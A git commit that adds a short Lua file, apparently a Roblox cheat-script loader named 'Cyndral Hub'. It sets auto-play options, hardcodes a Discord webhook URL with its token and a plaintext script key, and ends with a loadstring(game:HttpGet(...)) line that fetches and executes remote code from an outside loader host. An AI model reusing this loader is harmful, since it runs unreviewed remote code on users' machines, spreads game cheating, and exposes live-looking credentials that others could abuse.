41d12b0f2f3c19ac0784b062b8d8748acfd1d04f
Kenneth Nguyen <107379616+vurelix@users.noreply.github.com>
2025-07-18 02:50:46 -0500

    Create 109983668079237.lua

---
+++ 109983668079237.lua
@@ -0,0 +1,10 @@
+getgenv().Settings = {
+    ["Boost Speed"] = true,
+    ["Auto Kick If Have Player"] = false,
+    ["Rarity Send"] = {"Secret"},
+    ["Auto Shutdown If Script Update"] = true,
+    ["Note"] = "Cyndral Hub",
+    ["Webhook Url"] = "https://discord.com/api/webhooks/1395673829988368484/3cp9dWpbU5tZbdIwITtM7-Dc4WLiByx-h-OReqvdV4fLoQ0WZi-TpqLWd2ewKL7-o1bZ"
+}
+script_key="TDuPyrufKhPobLrVfGxuMtuiCDplxXUQ";
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/9c9747f436424ee148387af2f638bef6.lua"))() 
